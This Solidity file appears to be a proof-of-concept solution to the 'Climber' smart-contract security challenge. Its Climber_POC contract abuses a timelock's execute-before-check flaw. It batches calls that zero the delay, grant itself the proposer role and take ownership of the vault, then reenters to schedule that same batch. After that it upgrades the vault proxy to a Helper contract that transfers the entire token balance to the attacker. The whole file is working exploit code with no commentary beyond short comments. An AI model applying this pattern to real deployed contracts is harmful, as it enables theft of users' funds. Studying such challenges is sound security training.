// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./ClimberVault.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import { OwnableUpgradeable, UUPSUpgradeable, IERC20 } from "./ClimberVault.sol";

contract Helper is OwnableUpgradeable, UUPSUpgradeable {

    function exploit2(address token, address player, address px) external {
        ERC20(token).transfer(player, ERC20(token).balanceOf(address(px)));
    }

    function _authorizeUpgrade(address newImplementation) internal override onlyOwner {}
}

contract Climber_POC {
    ClimberTimelock public tm;
    ClimberVault public vt;
    UUPSUpgradeable public px;
    address public token;
    address public player;

    address[] public _targets = new address[](4);
    uint256[] public _values = [0, 0, 0, 0];
    bytes[] public _data = new bytes[](4);

    constructor(ClimberTimelock _tm, ClimberVault _vt, UUPSUpgradeable _px, address _token) {
        player = msg.sender;
        tm = _tm;
        vt = _vt;
        px = _px;
        token = _token;
    }

    function exploit() external {
        require(msg.sender == player, "only attacker");

        // change delay
        _data[0] = abi.encodeWithSignature("updateDelay(uint64)", 0);
        _targets[0] = payable(address(tm));

        // grant proposer role to this contract
        // data[0] = abi.encodeCall(AccessControl.grantRole, (PROPOSER_ROLE, address(this)));
        _data[1] = abi.encodeWithSignature("grantRole(bytes32,address)", PROPOSER_ROLE, address(this));
        _targets[1] = payable(address(tm));

        // change proxy owner
        // data[1] = abi.encodeCall(OwnableUpgradeable.transferOwnership, address(this));
        _data[2] = abi.encodeWithSignature("transferOwnership(address)", address(this));
        _targets[2] = address(vt);

        // scheduling this transaction through reentrancy attack
        _data[3] = abi.encodeWithSignature("scheduling()");
        _targets[3] = address(this);

        
        tm.execute(_targets, _values, _data, bytes32(""));


        Helper helper = new Helper();
        vt.upgradeTo(address(helper));

        Helper(address(vt)).exploit2(token, player, address(px));
    }

    function scheduling() public {
        tm.schedule(_targets, _values, _data, bytes32(""));
    }
}